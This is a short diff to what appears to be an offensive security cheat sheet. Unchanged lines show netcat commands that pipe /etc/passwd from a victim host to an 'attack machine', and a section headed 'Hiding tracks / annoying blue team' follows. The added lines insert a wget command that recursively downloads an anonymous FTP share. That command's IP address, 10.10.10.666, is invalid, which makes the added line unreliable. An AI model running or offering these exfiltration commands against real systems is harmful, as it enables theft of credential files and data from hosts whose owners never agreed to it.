@@ -25,6 +25,9 @@ tar -zcf - etc/passwd | pv | nc -l -p 5555 -q -5
 # Attack machine: 
 nc -w 3 192.168.225.131 5555 | tar -zxf -
 
+# Anonymous FTP dump to box
+wget --recursive --no-parent ftp://anonymous:anonymous@10.10.10.666/Program%20Data/
+
 - + - + - + - + - + - + - + - + - + - + - + - + 
 # Hiding tracks / annoying blue team
 - + - + - + - + - + - + - + - + - + - + - + - + 
